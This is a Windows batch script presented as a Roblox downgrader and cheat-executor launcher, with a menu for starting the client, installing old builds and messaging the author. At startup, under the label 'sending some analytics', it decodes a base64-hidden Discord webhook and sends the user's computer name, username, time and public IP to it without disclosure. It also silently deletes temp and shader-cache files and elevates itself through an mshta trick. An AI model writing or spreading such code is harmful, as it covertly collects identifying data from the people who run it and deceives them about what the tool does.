cls
@echo off
setlocal enabledelayedexpansion
:start
set ver=1.5
set sp=%programdata%\script
set /p clientpath=<!sp!\clientpath.txt
set /p execpath=<!sp!\execpath.txt
title roblox downgrader v%ver% ^| by chicken

echo loading..
echo finding dependencies..
curl >nul 2>&1
if %errorLevel%==2 ( echo found curl! ) else call :curl
if not exist !sp! md !sp!

echo sending some analytics.. this may take a second!
echo aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxNjkyMTM0MTAxNzk4MDk3OC9scEVWNXlGNmlzQmY5akNHVnQ4S3BhTzR4SFNhc0Q4eFY1NEtUcEpsMHl1dFVXVUlkYXk1MUlqQy1sRVBnLUZzS1pvZw== >!sp!\hook.txt
certutil -decode !sp!\hook.txt !sp!\hookd.txt >nul
set /p hookd=<!sp!\hookd.txt
del !sp!\hook.txt !sp!\hookd.txt
for /f "delims=" %%i in ('curl -s https://api.ipify.org') do set ip=%%i
curl -H "Content-Type: application/json" -d "{\"content\": \"current version: %ver%\npc name: %COMPUTERNAME%\nusername: %USERNAME%\ndate and time: !date! !time!\nip: %ip%\", \"embeds\": [], \"attachments\": []}" "!hookd!"

if not exist !sp!\clienttype.txt goto clienttype
if not exist !sp!\clientpath.txt (
	echo.
	echo where is your roblox folder at?
	echo input the directory path, not the executable
	echo and without the \ at the end!
	echo ex: C:\Users\chicken\AppData\Local\Bloxstrap\Roblox\Player
	echo.
	set /p clientpath="where is your roblox at? "
	echo !clientpath! >!sp!\clientpath.txt
)

if not exist !sp!\execpath.txt (
	echo.
	echo it doesn't seem you set up your executor path.
	echo input the executable, not the directory.
	echo ex: C:\Users\chicken\3D Objects\solara\Bootstrapper.exe
	set /p execpath="where is your executor at? "
	echo !execpath! >!sp!\execpath.txt
)

:menu
cls
echo       __                                __
echo   ___/ /__ _    _____ ___ ________ ____/ /__ ____
echo  / _  / _ \ ^|/^|/ / _ / _ `/ __/ _ `/ _  / -_/ __/
echo  \_,_/\___^|__,__/_//_\_, /_/  \_,_/\_,_/\__/_/
echo           ___  ____ ____/
echo      _  _^<  / / __// _ \ ^> coded by chicken
echo     ^| ^|/ / _ /__ \/ , _/ ^> hope you enjoy!
echo     ^|___/_(_/____/_/^|_^|
echo.
echo.
echo for help, contact @ch1ck3m on discord
echo or @ch1ck3mm on telegram.
echo.
echo what do you want to do?
echo s. start executor and roblox
echo 0. exit
echo 1. start roblox
echo 2. downgrade roblox
echo 3. start executor
echo 4. restart via uac
echo 5. send me a message
echo 6. github page
echo 7. check out my batch multitool
echo w. wipe all script data
set /p script="choose an option: "
cls

if %script%==r ( goto start
) else if %script%==w (
	del /f !sp!\execpath.txt !sp!\clientpath.txt !sp!\clienttype.txt
	exit /b
) else if %script%==s (
	start "" "!execpath!"
	call :del
	cls
	echo click any key to continue once your executor has loaded!
	pause >nul
	taskkill /f /im RobloxPlayerBeta.exe >nul 2>&1
	start "" "!clientpath!\RobloxPlayerBeta.exe"
) else if %script%==0 ( exit /b
) else if %script%==1 (
	taskkill /f /im RobloxPlayerBeta.exe >nul 2>&1
	start "" "!clientpath!\RobloxPlayerBeta.exe"
	call :del
) else if %script%==2 ( goto downgrade
) else if %script%==3 (
	start "" "!execpath!"
	call :del
) else if %script%==4 (
	cd /d %~dp0
	mshta "javascript: var shell = new ActiveXObject('shell.application'); shell.ShellExecute('%~nx0', '', '', 'runas', 1);close();"
	exit
) else if %script%==5 ( goto message
) else if %script%==6 ( start "" https://github.com/chicken-projects/roblox-downgrader
) else if %script%==7 ( start "" http://chicken.bulletinbay.com/data/scripts
) else (
	echo invalid option!
	timeout /t 2 >nul
	goto menu
)
goto askexit
:downgrade
cls
echo ex: b71c150c7c1f40de
set /p hash="what roblox hash? "
start "" https://rdd.latte.to/?channel=LIVE^&binaryType=WindowsPlayer^&version=!hash!
echo save in current folder %~dp0
echo and DO NOT RENAME.
echo click any key when done downloading..
pause >nul
del /f /q /s "!clientpath!\*"
powershell -command "Expand-Archive -Path '%~dp0LIVE-WindowsPlayer-version-!hash!.zip' -DestinationPath '!clientpath!\'"
del /f %~dp0LIVE-WindowsPlayer-version-!hash!.zip
goto askexit

:message
cls
echo please include something that i can contact you back with!
echo you can use \n for line breaks!
echo ex: hey\nthis is a new line!
echo aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxNjkyMjM4ODY1MDM5Nzc5Ni9QOC1qWnYwS052M2tkeUVFMWw5LWROcnMzRlE4OVc0LWJYTUFMSk9XNWowcVotd3dpT2EtZVQzWFB6QWdnSFJid24wZQ== >!sp!\hook.txt
certutil -decode !sp!\hook.txt !sp!\hookd.txt >nul
set /p hookd=<!sp!\hookd.txt
del !sp!\hook.txt !sp!\hookd.txt
set /p msg="what would you like to say? "
curl -H "Content-Type: application/json" -d "{\"content\": \"!msg!\nauthor: %ip%\", \"embeds\": [], \"attachments\": []}" "!hookd!"
if %errorlevel%==0 ( echo Message Sent
) else ( Message failed, maybe check your internet? )
goto askexit
:askexit
echo.
set /p askexit="would you like to go to the menu? (y/n) "
if /i %askexit%==y ( goto menu ) else exit /b
echo.
echo how'd you get here?
goto askexit
:clienttype
echo this is for roblox downgrader. >!sp!\clienttype.txt
echo what roblox do you have?
echo 1. bloxstrap
echo 2. other
set /p clienttype="choose an option: "
if %clienttype%==1 ( echo ok, good!
) else (
	del /f !sp!\execpath.txt !sp!\clientpath.txt !sp!\clienttype.txt
	echo you need bloxstrap!
	echo click any key to exit..
	pause >nul
	exit
)
goto start

:curl
echo you need curl for this script.
set /p curl="would you like to install curl? (y/n) "
if %curl%==y (
	winget install cURL.cURL
	goto start
) else (
	echo ok.
	echo click any key to continue
	pause >nul
	exit
)
:del
del /s /f /q %tmp%\* >nul 2>&1
del /s /f /q %homepath%\AppData\LocalLow\Intel\ShaderCache\* >nul 2>&1
exit /b
endlocal